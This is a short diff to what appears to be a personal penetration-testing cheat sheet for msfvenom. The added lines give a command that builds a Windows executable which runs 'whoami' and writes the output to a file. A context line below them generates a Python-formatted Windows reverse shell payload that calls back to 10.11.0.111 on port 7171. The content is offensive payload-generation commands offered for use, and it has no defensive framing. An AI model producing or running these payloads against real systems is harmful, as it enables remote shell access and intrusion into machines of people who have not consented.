@@ -1,6 +1,12 @@
 ## msfvenom
 -----
 
+#### Run whoami and pipe to text file ####
+
+```msfvenom -p windows/x64/exec -a x64 --platform windows CMD='cmd "/c whoami > c:\test.txt"' -f exe -o Program.exe```
+
+-----
+
 #### var name "payload" and type python, windows non-staged reverse shell
 
 ```msfvenom -p windows/shell_reverse_tcp -f py --var-name payload LHOST=10.11.0.111 LPORT=7171```
